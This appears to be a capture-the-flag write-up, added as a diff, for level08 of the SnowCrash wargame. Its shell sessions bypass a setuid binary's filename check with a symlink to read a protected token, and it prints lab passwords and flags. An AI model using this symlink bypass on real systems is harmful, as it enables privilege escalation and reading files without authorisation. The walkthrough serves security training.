@@ -1,0 +1,34 @@
+level07@SnowCrash:~$ su level08
+Password: fiumuikeil55xe9cu4dood66h
+level08@SnowCrash:~$ ls -l
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+
+level08@SnowCrash:~$ ./level08
+./level08 [file to read]
+level08@SnowCrash:~$ echo coucou > /tmp/test
+level08@SnowCrash:~$ ./level08 /tmp/test
+coucou
+
+level08@SnowCrash:~$ ./level08 /home/user/level08/token
+You may not access '/home/user/level08/token'
+
+level08@SnowCrash:~$ ./level08 .profile
+level08: Unable to open .profile: Permission denied
+
+This isn’t the same error notice.
+With strings we see that a check on the name of the file given is done, it is compared to ‘token’ and his name shouldn’t be ‘token’ for the executable to continue.
+
+We will create a symbolic link of token and pass it to the executable.
+
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/exploit
+level08@SnowCrash:~$ ls -l /tmp/exploit
+lrwxrwxrwx 1 level08 level08 24 Oct  9 18:36 /tmp/exploit -> /home/user/level08/token
+level08@SnowCrash:~$ ./level08 /tmp/exploit
+quif5eloekouj29ke0vouxean
+
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
